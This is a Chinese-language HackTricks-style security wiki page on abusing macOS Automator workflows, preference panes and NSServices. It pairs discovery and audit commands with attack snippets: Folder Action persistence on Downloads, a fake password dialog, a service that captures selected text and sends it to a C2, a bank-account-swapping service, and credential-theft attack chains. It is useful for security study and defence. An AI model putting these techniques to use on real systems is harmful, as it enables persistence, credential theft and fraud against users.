# macOS Automator、Preference Panes 与 NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions 与 Workflows

### 基本信息

**Automator** 是 macOS 的可视化自动化工具。它执行由 **actions**（`.action` bundles）组成的 **workflows**（`.workflow` bundles）。Automator 还为 **Folder Actions**、**Quick Actions** 和 **Shortcuts** 集成提供支持。在现代 macOS 上，workflows 也可以被**导入 Shortcuts**，因此相同的恶意逻辑可能以 Finder Quick Action、`~/Library/Services/` 下的用户 service，或由旧版 Automator actions 支持的 shortcut 形式出现。

Automator actions 是在 workflow 执行时加载到 Automator runtime 中的 **plugins**。它们可以：
- 执行任意 shell scripts
- 处理文件和数据
- 通过 AppleScript 与应用程序交互
- 组合起来实现复杂的自动化

### 这为何重要

> [!WARNING]
> Automator workflows 可以通过**社会工程**诱导执行——它们看起来只是简单的文档文件。`.workflow` bundle 可以包含在 workflow 运行时执行的嵌入式 shell commands。结合 Folder Actions 后，它们可以提供在文件事件触发时自动运行的**持久化**机制。近期 Gatekeeper 的修复还表明，**app-bundled Quick Actions**（`Contents/PlugIns/*.workflow`）必须被视为可执行内容，而不是无害数据。

### 发现
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

对大多数用户而言，`.workflow` bundle 看起来就像普通的文档文件：
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions 会在文件被添加到受监控文件夹时自动执行 workflow：
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions 会在重启后持续存在并静默执行。在 `~/Downloads` 上设置 Folder Action 意味着**每个下载的文件都会触发你的 payload**——包括来自 Safari、Chrome、AirDrop 和电子邮件附件的文件。另请注意，`System Events` 可以注册指向默认 `~/Library/Scripts/Folder Action Scripts` 目录之外脚本的 Folder Actions，因此检查散落路径很有价值。有关相关的 TCC 影响，请查看[ TCC 页面](../macos-security-protections/macos-tcc/README.md)。

---

## 偏好设置面板

### 基本信息

偏好设置面板（`.prefPane` bundles）是由 **System Settings**（以前称为 System Preferences）加载的 plugins。它们为系统或第三方功能提供配置 UI 面板。在较旧的系统中，它们由 `System Preferences` 直接加载；在较新的版本中，第三方面板通常由从 System Settings 启动的 **legacy loader XPC service** 代理加载。

### 这为何重要

- 偏好设置面板会在由 System Settings / System Preferences 生成的**受信任 host process**中执行
- 在现代系统中，该 host 可能是 **`legacyLoader` XPC service**，因此关键边界仍然是**受信任的 Apple UI process -> 第三方代码加载**
- 第三方偏好设置面板会继承 **host process 的 security context** 以及与该 UI 关联的用户信任
- 用户通过**双击**安装偏好设置面板——很容易进行 social engineering
- 安装后，它们会**持久化**，每次 System Settings 打开该面板时都会加载

### 发现
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

恶意 preference pane 会继承 **pane host** 的安全上下文（历史上为 `System Preferences`，在较新版本中通常是由 `System Settings` 启动的 `legacyLoader` helper）：
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### 攻击：通过安装实现持久化
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

偏好设置面板可以模仿合法的系统 UI 面板，以**phish for credentials**：
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### 基本信息

**NSServices** 允许应用通过 **Services menu**（右键 → Services）向其他应用提供功能。当用户选择文本或数据并调用某项 service 时，所选数据会被**发送给 service provider**进行处理。

Services 会在应用的 `Info.plist` 中通过 `NSServices` key 声明，并注册到 pasteboard server（`pbs`）。macOS 还会维护一个 **service cache** 和一个**限制策略**，用于决定哪些 services 可见，以及 sandboxed caller 是否应收到额外警告。

### 为什么这很重要

- Services 接收**跨应用数据流**——来自任何应用的选中文本都会发送给该 service
- 恶意 service 可以捕获 password managers、email clients 和 financial apps 中的数据
- Services 可以向调用应用**返回修改后的数据**（针对选择操作的 man-in-the-middle）
- Service 名称可以伪装得很合法（"Format Text"、"Encrypt Selection"、"Share"）
- 可选的 `NSRestricted` flag 与安全性相关：标记为 unrestricted 的 service 可能会被 sandboxed app 调用，而不会触发 macOS 针对可能导致 escape 的 services 所显示的警告<sup>[[2]](#references)</sup>

### 发现
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### 攻击：Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Data Modification (Man-in-the-Middle)

服务可以在看似提供合法功能的同时，**修改返回的数据**：
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple 支持为每个 service 定义设置可选的 `NSRestricted` boolean。启用后，macOS 会向 sandboxed callers 发出警告，因为该 service 可能帮助它们 **escape sandbox or privacy boundaries**。从 offensive 角度看，这提供了两条有用的审计路径：

- 查找**未标记为 restricted 的第三方 services**，即使它们代理 Apple Events、文件访问或其他 privileged actions
- 查找具有强 entitlements 的**高价值内置 services**（例如由 Script Editor 或 Finder-backed helpers 暴露的 services），并检查是否仅需用户交互就能将其变成 data-access primitive

一个较新的典型例子是 **CVE-2022-48574**：Services mechanism 可被滥用，在**不经过预期确认流程的情况下访问受 TCC 保护的用户文件**。该漏洞已经修复，但这一技术对于 threat modeling 仍然有用：任何代表 caller 转发文件访问或 automation 请求的 service，都应接受同等程度的审查。<sup>[[2]](#references)</sup>

---

## Recent Security Notes

- **Quick Actions 是可执行内容**：Apple 在 2024 年修复了一个 Gatekeeper bypass；在该问题中，app-bundled Automator Quick Action 可在未经过正常 assessment 的情况下运行。审计 apps 时，应检查 `Contents/PlugIns/*.workflow/Contents/document.wflow`，方式与检查 helper scripts 或 login items 完全相同。参见 [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md)。<sup>[[1]](#references)</sup>
- **Shortcuts 可能继承 legacy Automator 行为**：在发现 third-party shortcuts 使用**legacy Automator action**，在未经过预期 permission flow 的情况下发送 Apple Events 后，Apple 还增加了额外的 user-consent prompt。应检查 imported workflows 和 shortcut bundles 中的 `Run AppleScript`、`Run Shell Script` 以及类似的 bridge actions。参见 [the TCC page](../macos-security-protections/macos-tcc/README.md)。
- **Automator 仍然是一个有效的 privacy boundary**：Apple 在 2025 年再次修复了 Automator 访问受保护用户数据的问题。即使 Automator 是一个 legacy surface，也应将任何 workflow runner、Quick Action host 或 automation bridge 视为当前的 attack surface，而不是 dead code。

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### 偏好设置面板 → TCC 提权
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Password Manager 窃取
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## 参考资料

- [1] [Apple — macOS Ventura 13.7、Sonoma 14.7 和 Sequoia 15 的安全内容](https://support.apple.com/en-us/121238)
- [2] [Moonlock — NSServices exploit 在 macOS 上的工作原理](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
